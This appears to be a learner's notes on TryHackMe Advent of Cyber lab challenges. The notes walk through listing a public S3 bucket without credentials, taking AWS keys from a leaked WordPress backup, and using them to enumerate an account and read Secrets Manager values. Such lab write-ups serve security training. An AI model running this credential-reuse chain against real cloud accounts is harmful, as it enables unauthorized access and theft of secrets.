# Advent of Cyber

## Advent of Cyber 2

These notes are from a challenge I did @[tryhackme](https://tryhackme.com) called [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2).

## [Day 16] Scripting Help! Where is Santa?

Python One-Liner to query the API :)

``` python
import requests 
for number in range (1,100,2): print(f'{number} --> ' + requests.get(f'http://localhost:8080/api/{number}').text)
```

## Advent of Cyber 3

## [Day 17] Cloud Elf Leaks

Install CLI

``` sh
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

Get details on S3 bucket

``` sh
aws s3 ls s3://images.bestfestivalcompany.com/ --no-sign-request

curl https://s3.amazonaws.com/images.bestfestivalcompany.com/wp-backup.zip

define('S3_UPLOADS_BUCKET', 'images.bestfestivalcompany.com');
define('S3_UPLOADS_KEY', 'AKIAQI52OJVCPZXFYAOI');
define('S3_UPLOADS_SECRET', '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');
define('S3_UPLOADS_REGION', 'us-east-1');
```

AWS IAM

``` sh
aws configure
AWS Access Key ID [None]: AKIAQI52OJVCPZXFYAOI
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]:
```

AWS get details

``` sh
aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI
aws s3 ls --profile PROFILENAME 
aws sts get-caller-identity --profile PROFILENAME
aws ec2 describe-instances --output text --profile PROFILENAME
aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME
```

AWS Secrets Manager

``` sh
aws secretsmanager list-secrets --region us-north-1
aws secretsmanager list-secrets --region eu-north-1
aws secretsmanager get-secret-value --secret-id HR-Password --region eu-north-1
```
